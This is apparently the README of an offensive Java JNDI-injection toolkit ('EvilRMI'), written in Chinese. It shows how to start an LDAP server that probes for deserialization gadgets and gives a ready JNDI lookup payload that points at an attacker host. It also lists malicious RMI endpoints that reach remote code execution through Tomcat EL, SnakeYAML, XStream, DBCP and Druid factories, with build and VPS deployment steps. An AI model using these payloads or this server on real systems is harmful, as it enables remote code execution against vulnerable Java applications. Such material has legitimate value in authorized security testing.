### 探测可用的gadget
[UrlDns](https://github.com/kezibei/Urldns) 启动LDAP服务:
```
java -jar Urldns.jar ldap all <dnslog>
```
JNDI加载LDAP：`${jndi:ldap://<ip>:1389/Hello}`，利用LDAP反序列化的特性使用URLDNS探测存在的gadget

如果DNS未出网，可以使用延时探测: [构造java探测class反序列化gadget
](https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA>)

执行命令测试成功：
```
tomcat_el
tomcat_el_runtime
tomcat_MVEL
tomcat_xstream
tomcat_snakeyaml
tomcat_tomcat_dbcp2_RCE
druid
```


### RmiServer

- `rmi://127.0.0.1:1099/tomcat_el`
- `rmi://127.0.0.1:1099/tomcat_el_runtime`
    - javax_el_ELProcessor
- `rmi://127.0.0.1:1099/tomcat_groovy`
- `rmi://127.0.0.1:1099/tomcat_snakeyaml`
    - org_yaml_snakeyaml_Yaml
- `rmi://127.0.0.1:1099/tomcat_xstream`
    - Xstream <= 1.4.17
- `rmi://127.0.0.1:1099/tomcat_MVEL`
    - org_mvel2_sh_ShellSession
- `rmi://127.0.0.1:1099/tomcat_xxe`
    - org_apache_catalina_UserDatabase
- `rmi://127.0.0.1:1099/tomcat_dbcp2_RCE`
    - org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
- `rmi://127.0.0.1:1099/tomcat_dbcp1_RCE`
    - org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
- `rmi://127.0.0.1:1099/commons_dbcp2_RCE`
    - org.apache.commons.dbcp2.BasicDataSourceFactory
- `rmi://127.0.0.1:1099/commons_dbcp1_RCE`
    - org.apache.commons.dbcp.BasicDataSourceFactory
- `rmi://127.0.0.1:1099/tomcat_JDBC_RCE`
    - org.apache.tomcat.jdbc.pool.DataSourceFactory
- `rmi://127.0.0.1:1099/druid`
    - com.alibaba.druid.pool.DruidDataSourceFactory

#### 编译运行(注意放到VPS的时候修改`java.rmi.server.hostname`)
1. File -> Project Structure -> Artifats -> + -> Add Jar -> Main Class -> com.rmi.RmiServer
2. Build -> Build Artifats
3. java -cp EvilRMI.jar com.rmi.RmiServer

#### 参考链接
* [老链新用，利用URLDNS链探测gadget](https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA)
* [Urldns链探测类工具发放](https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw)
* [构造java探测class反序列化gadget](https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA)
* [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
* [ysoserial-for-woodpecker](https://github.com/woodpecker-framework/ysoserial-for-woodpecker)